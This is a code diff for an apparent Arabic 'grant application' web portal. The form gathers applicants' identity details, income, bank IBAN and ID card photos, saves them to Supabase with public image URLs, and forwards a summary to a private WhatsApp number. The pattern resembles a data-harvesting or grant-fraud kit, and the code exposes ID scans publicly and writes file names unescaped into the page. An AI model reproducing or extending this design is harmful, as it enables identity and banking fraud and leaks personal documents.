@@ -1,8 +1,6 @@
 /* ================================
-   PORTAL JAVASCRIPT - FIXED
-   ======*/
-
-
+   PORTAL JAVASCRIPT - FINAL FIX
+   ================================ */
 
 let currentLanguage = 'ar';
 let currentStep = 1;
@@ -19,14 +17,12 @@ document.addEventListener('DOMContentLoaded', function() {
     setupLanguageSwitchers();
     setupFormListeners();
     setupFileUpload();
-    setupPhoneFormatting();
     setupIBANFormatting();
 });
 
 // ================================
 // LANGUAGE
 // ================================
-
 function setupLanguageSwitchers() {
     document.querySelectorAll('.lang-btn').forEach(btn => {
         btn.addEventListener('click', function() {
@@ -55,7 +51,6 @@ function switchLanguage(lang) {
 // ================================
 // NAVIGATION
 // ================================
-
 function nextStep() {
     if (validateStep(currentStep)) {
         saveStepData(currentStep);
@@ -74,14 +69,14 @@ function prevStep() {
 
 function showStep(stepNumber) {
     document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
-    document.getElementById(`formStep${stepNumber}`).classList.add('active');
+    document.getElementById('formStep' + stepNumber).classList.add('active');
     document.querySelector('.portal-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
 function updateProgressBar() {
     document.getElementById('progressFill').style.width = (currentStep / 5 * 100) + '%';
-    for (let i = 1; i <= 5; i++) {
-        const el = document.getElementById(`step${i}`);
+    for (var i = 1; i <= 5; i++) {
+        var el = document.getElementById('step' + i);
         el.classList.remove('active', 'completed');
         if (i < currentStep) el.classList.add('completed');
         else if (i === currentStep) el.classList.add('active');
@@ -91,44 +86,36 @@ function updateProgressBar() {
 // ================================
 // VALIDATION
 // ================================
-
 function validateStep(stepNumber) {
-    let isValid = true;
-    const step = document.getElementById(`formStep${stepNumber}`);
+    var isValid = true;
+    var step = document.getElementById('formStep' + stepNumber);
 
-    // الحقول العادية
-    step.querySelectorAll('[required]').forEach(input => {
+    step.querySelectorAll('[required]').forEach(function(input) {
         if (input.type === 'file' || input.type === 'checkbox') return;
         if (!validateField(input)) isValid = false;
     });
 
-    // الخطوة 5: الملفات + الشروط
     if (stepNumber === 5) {
-        ['idCardFront', 'idCardBack'].forEach(id => {
-            const errorEl = document.getElementById(id + 'Error');
+        ['idCardFront', 'idCardBack'].forEach(function(id) {
+            var errorEl = document.getElementById(id + 'Error');
             if (!formData.attachments[id]) {
-                if (errorEl) errorEl.textContent = currentLanguage === 'ar'
-                    ? 'يرجى رفع هذه الصورة'
-                    : 'Please upload this photo';
+                if (errorEl) errorEl.textContent = currentLanguage === 'ar' ? 'يرجى رفع هذه الصورة' : 'Please upload this photo';
                 isValid = false;
             } else {
                 if (errorEl) errorEl.textContent = '';
             }
         });
-
-        if (!document.getElementById('terms').checked) {
-            isValid = false;
-        }
+        if (!document.getElementById('terms').checked) isValid = false;
     }
 
     return isValid;
 }
 
 function validateField(field) {
-    const value = field.value.trim();
-    const errorEl = field.closest('.form-group') && field.closest('.form-group').querySelector('.error-message');
-    let isValid = true;
-    let msg = '';
+    var value = field.value.trim();
+    var errorEl = field.closest('.form-group') && field.closest('.form-group').querySelector('.error-message');
+    var isValid = true;
+    var msg = '';
 
     if (!value) {
         isValid = false;
@@ -155,139 +142,85 @@ function validateField(field) {
 // ================================
 // SAVE STEP DATA
 // ================================
-
 function saveStepData(stepNumber) {
-    const step = document.getElementById(`formStep${stepNumber}`);
-    const groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
-    const group = groups[stepNumber];
+    var step = document.getElementById('formStep' + stepNumber);
+    var groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
+    var group = groups[stepNumber];
     if (!group) return;
-    step.querySelectorAll('input, select, textarea').forEach(input => {
+    step.querySelectorAll('input, select, textarea').forEach(function(input) {
         if (input.type === 'file' || input.type === 'checkbox') return;
         if (input.name) group[input.name] = input.value;
     });
 }
 
 // ================================
-// FILE UPLOAD — الحل النهائي
+// FILE UPLOAD
 // ================================
-
 function setupFileUpload() {
-    ['idCardFront', 'idCardBack'].forEach(id => {
-        const input   = document.getElementById(id);
-        const preview = document.getElementById(id + 'Preview');
-        const errorEl = document.getElementById(id + 'Error');
-        const area    = document.getElementById(id + 'Area');
-
+    ['idCardFront', 'idCardBack'].forEach(function(id) {
+        var input   = document.getElementById(id);
+        var preview = document.getElementById(id + 'Preview');
+        var errorEl = document.getElementById(id + 'Error');
+        var area    = document.getElementById(id + 'Area');
         if (!input) return;
 
-        // ✅ الحدث الوحيد الذي يعمل بشكل مضمون على كل الأجهزة
         input.addEventListener('change', function() {
-            const file = this.files && this.files[0];
+            var file = this.files && this.files[0];
             if (!file) return;
             processFile(file, id, input, preview, errorEl, area);
         });
-
-        // Drag & drop للكمبيوتر
-        if (area) {
-            area.addEventListener('dragover', e => {
-                e.preventDefault();
-                area.classList.add('drag-over');
-            });
-            area.addEventListener('dragleave', () => area.classList.remove('drag-over'));
-            area.addEventListener('drop', e => {
-                e.preventDefault();
-                area.classList.remove('drag-over');
-                const file = e.dataTransfer.files[0];
-                if (file) processFile(file, id, input, preview, errorEl, area);
-            });
-        }
     });
 }
 
 function processFile(file, id, input, preview, errorEl, area) {
-    // تحقق من الحجم
     if (file.size > 5 * 1024 * 1024) {
-        if (errorEl) errorEl.textContent = currentLanguage === 'ar'
-            ? 'حجم الملف أكبر من 5 ميجابايت'
-            : 'File size exceeds 5MB';
+        if (errorEl) errorEl.textContent = 'حجم الملف أكبر من 5 ميجابايت';
         input.value = '';
         return;
     }
-
-    // تحقق من النوع — نقبل أيضاً image/* لأن بعض أجهزة الجوال ترسل MIME مختلف
-    const allowed = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
-    if (!allowed.includes(file.type) && !file.type.startsWith('image/')) {
-        if (errorEl) errorEl.textContent = currentLanguage === 'ar'
-            ? 'يُسمح فقط بـ JPG أو PNG أو PDF'
-            : 'Only JPG, PNG, or PDF allowed';
+    if (!file.type.startsWith('image/') && file.type !== 'application/pdf') {
+        if (errorEl) errorEl.textContent = 'يُسمح فقط بـ JPG أو PNG أو PDF';
         input.value = '';
         return;
     }
-
-    // مسح الخطأ
     if (errorEl) errorEl.textContent = '';
-
-    // حفظ الملف
     formData.attachments[id] = file;
 
-    // إظهار Preview
-    preview.innerHTML = `
-        <i class="fas fa-check-circle" style="color:#27ae60;font-size:1.2rem;flex-shrink:0;"></i>
-        <span style="flex:1;word-break:break-all;font-size:0.9rem;">${file.name}</span>
-        <button type="button" onclick="removeFile('${id}')" style="background:none;border:none;cursor:pointer;color:#e74c3c;font-size:1.1rem;">
-            <i class="fas fa-times"></i>
-        </button>
-    `;
-    preview.style.display = 'flex';
-    preview.style.alignItems = 'center';
-    preview.style.gap = '0.5rem';
+    preview.innerHTML = '<i class="fas fa-check-circle" style="color:#27ae60"></i> ' + file.name;
+    preview.style.display = 'block';
     preview.style.padding = '0.8rem';
     preview.style.background = '#f0fdf4';
     preview.style.borderRadius = '8px';
     preview.style.marginTop = '0.5rem';
-
-    // تغيير لون منطقة الرفع للتأكيد
-    if (area) {
-        area.style.borderColor = '#27ae60';
-        area.style.backgroundColor = 'rgba(39,174,96,0.05)';
-    }
+    if (area) area.style.borderColor = '#27ae60';
 }
 
 function removeFile(id) {
-    const input   = document.getElementById(id);
-    const preview = document.getElementById(id + 'Preview');
-    const area    = document.getElementById(id + 'Area');
-
+    var input   = document.getElementById(id);
+    var preview = document.getElementById(id + 'Preview');
+    var area    = document.getElementById(id + 'Area');
     if (input) input.value = '';
     if (preview) { preview.style.display = 'none'; preview.innerHTML = ''; }
-    if (area) { area.style.borderColor = ''; area.style.backgroundColor = ''; }
+    if (area) area.style.borderColor = '';
     delete formData.attachments[id];
 }
 
 // ================================
-// FORMATTING
+// IBAN FORMAT
 // ================================
-
-function setupPhoneFormatting() {
-    var phone = document.getElementById('phone');
-    if (!phone) return;
-    // نمسح التنسيق التلقائي تماماً — المستخدم يكتب كما يريد
-    // التحقق يتم فقط عند الانتقال للخطوة التالية
-}
-
 function setupIBANFormatting() {
-    const iban = document.getElementById('iban');
+    var iban = document.getElementById('iban');
     if (!iban) return;
     iban.addEventListener('input', function() {
-        let v = this.value.toUpperCase().replace(/\s/g, '');
+        var v = this.value.toUpperCase().replace(/\s/g, '');
         if (!v.startsWith('SA')) v = 'SA' + v.replace(/[^0-9]/g, '');
         v = v.slice(0, 24);
-        this.value = v.match(/.{1,4}/g)?.join(' ') || v;
+        this.value = v.match(/.{1,4}/g) ? v.match(/.{1,4}/g).join(' ') : v;
     });
 }
 
 // ================================
-// FORM SUBMISSION
+// SUBMIT
 // ================================
 function setupFormListeners() {
     var submitBtn = document.getElementById('submitBtn');
@@ -295,34 +228,35 @@ function setupFormListeners() {
 
     submitBtn.addEventListener('click', async function() {
         if (!validateStep(5)) return;
-
         saveStepData(5);
 
-        var txNumber = 'WA-' + new Date().getFullYear() + '-' +
-            String(Math.floor(Math.random() * 10000)).padStart(4, '0');
-
-        // أولاً احفظ في Supabase
+        // تعطيل الزر أثناء الحفظ
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
 
-        await saveToSupabase(txNumber);
+        var txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 90000) + 10000);
 
-        // ثم أظهر النجاح
-        document.getElementById('transactionNumber').textContent = txNumber;
-        document.getElementById('successModal').classList.add('active');
+        // حفظ في Supabase أولاً
+        var saved = await saveToSupabase(txNumber);
 
+        // إعادة تفعيل الزر
         submitBtn.disabled = false;
         submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> تقديم الطلب';
 
         // فتح واتس آب
         var msg = encodeURIComponent(
-            'مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ' + txNumber +
-            '\nالاسم: ' + (formData.personalInfo.fullName || '') +
-            '\nالهاتف: ' + (formData.contactCareer.phone || '') +
-            '\nنوع المنحة: ' + (formData.grantDetails.grantType || '') +
-            '\nالمبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
+            'مرحباً، لقد قمت بتقديم طلب منحة.\n' +
+            'رقم المعاملة: ' + txNumber + '\n' +
+            'الاسم: ' + (formData.personalInfo.fullName || '') + '\n' +
+            'الهاتف: ' + (formData.contactCareer.phone || '') + '\n' +
+            'نوع المنحة: ' + (formData.grantDetails.grantType || '') + '\n' +
+            'المبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
         );
         window.open('https://wa.me/966545239928?text=' + msg, '_blank');
+
+        // إظهار رسالة النجاح
+        document.getElementById('transactionNumber').textContent = txNumber;
+        document.getElementById('successModal').classList.add('active');
     });
 }
 
@@ -337,89 +271,83 @@ function redirectToWhatsApp() {
 }
 
 // ================================
-// SUPABASE (في الخلفية)
+// SUPABASE
 // ================================
-
 async function saveToSupabase(txNumber) {
-    if (typeof supabase === 'undefined') {
-        console.error('❌ Supabase غير معرّف');
-        return;
-    }
-
     try {
-        // 1. حفظ البيانات أولاً بدون صور
-        const appData = {
-            full_name:         formData.personalInfo.fullName      || '',
-            phone:             formData.contactCareer.phone        || '',
-            email:             formData.contactCareer.email        || '',
-            country:           formData.personalInfo.country       || '',
-            marital_status:    formData.personalInfo.maritalStatus || '',
-            num_children:      parseInt(formData.personalInfo.numChildren) || 0,
-            profession:        formData.contactCareer.profession   || '',
-            monthly_income:    parseInt(formData.contactCareer.income) || 0,
-            grant_type:        formData.grantDetails.grantType     || '',
-            grant_amount:      parseInt(formData.grantDetails.grantAmount) || 0,
-            grant_description: formData.grantDetails.grantDescription || '',
-            bank_name:         formData.bankingInfo.bankName       || '',
-            account_holder:    formData.bankingInfo.accountHolder  || '',
-            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, ''),
-            transaction_id:    txNumber,
-            status:            'pending',
-            created_at:        new Date().toISOString()
-        };
-
-        console.log('📤 إرسال البيانات:', appData);
-
-        const { data: insertData, error: insertError } = await supabase
-            .from('applications')
-            .insert([appData])
-            .select();
-
-        if (insertError) {
-            console.error('❌ خطأ في الحفظ:', insertError.message);
-            return;
+        // التحقق من وجود Supabase
+        if (typeof window.supabase === 'undefined') {
+            console.error('❌ Supabase غير موجود');
+            return false;
         }
 
-        console.log('✅ تم حفظ البيانات بنجاح:', insertData);
+        var client = window.supabase;
 
-        // 2. رفع الصور بشكل منفصل (لا يوقف الحفظ إذا فشل)
-        const recordId = insertData[0]?.id;
-        for (const [key, label] of [['idCardFront', 'front'], ['idCardBack', 'back']]) {
-            const file = formData.attachments[key];
-            if (!file) continue;
-            try {
-                const path = `${txNumber}/${label}_${Date.now()}.${file.name.split('.').pop()}`;
-                const { error: uploadError } = await supabase.storage
-                    .from('applications')
-                    .upload(path, file, { upsert: true });
+        var appData = {
+            transaction_id:    txNumber,
+            full_name:         formData.personalInfo.fullName       || '',
+            country:           formData.personalInfo.country        || '',
+            marital_status:    formData.personalInfo.maritalStatus  || '',
+            num_children:      parseInt(formData.personalInfo.numChildren) || 0,
+            phone:             formData.contactCareer.phone         || '',
+            email:             formData.contactCareer.email         || '',
+            profession:        formData.contactCareer.profession    || '',
+            monthly_income:    parseInt(formData.contactCareer.income) || 0,
+            grant_type:        formData.grantDetails.grantType      || '',
+            grant_amount:      parseInt(formData.grantDetails.grantAmount) || 0,
+            grant_description: formData.grantDetails.grantDescription || '',
+            bank_name:         formData.bankingInfo.bankName        || '',
+            account_holder:    formData.bankingInfo.accountHolder   || '',
+            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, ''),
+            status:            'pending'
+        };
 
-                if (!uploadError) {
-                    const { data: urlData } = supabase.storage
-                        .from('applications')
-                        .getPublicUrl(path);
+        console.log('📤 حفظ البيانات:', appData);
 
-                    await supabase
-                        .from('applications')
-                        .update({ [`id_card_${label}_url`]: urlData.publicUrl })
-                        .eq('id', recordId);
+        var result = await client.from('applications').insert([appData]).select();
 
-                    console.log(`✅ تم رفع صورة ${label}`);
-                } else {
-                    console.warn(`⚠️ فشل رفع صورة ${label}:`, uploadError.message);
+        if (result.error) {
+            console.error('❌ خطأ:', result.error.message);
+            return false;
+        }
+
+        console.log('✅ تم الحفظ بنجاح!', result.data);
+
+        // رفع الصور
+        var recordId = result.data[0] && result.data[0].id;
+        if (recordId) {
+            for (var i = 0; i < 2; i++) {
+                var key   = i === 0 ? 'idCardFront' : 'idCardBack';
+                var label = i === 0 ? 'front' : 'back';
+                var file  = formData.attachments[key];
+                if (!file) continue;
+                try {
+                    var path = txNumber + '/' + label + '_' + Date.now() + '.' + file.name.split('.').pop();
+                    var uploadResult = await client.storage.from('applications').upload(path, file, { upsert: true });
+                    if (!uploadResult.error) {
+                        var urlResult = client.storage.from('applications').getPublicUrl(path);
+                        var updateObj = {};
+                        updateObj['id_card_' + label + '_url'] = urlResult.data.publicUrl;
+                        await client.from('applications').update(updateObj).eq('id', recordId);
+                        console.log('✅ تم رفع صورة ' + label);
+                    }
+                } catch(e) {
+                    console.warn('⚠️ فشل رفع الصورة:', e);
                 }
-            } catch (imgErr) {
-                console.warn(`⚠️ خطأ صورة ${label}:`, imgErr);
             }
         }
 
-    } catch (err) {
+        return true;
+
+    } catch(err) {
         console.error('❌ خطأ عام:', err);
+        return false;
     }
 }
 
 // Validation on blur
 document.addEventListener('DOMContentLoaded', function() {
-    document.querySelectorAll('input:not([type=file]), select, textarea').forEach(field => {
+    document.querySelectorAll('input:not([type=file]), select, textarea').forEach(function(field) {
         field.addEventListener('blur', function() {
             if (this.hasAttribute('required')) validateField(this);
         });
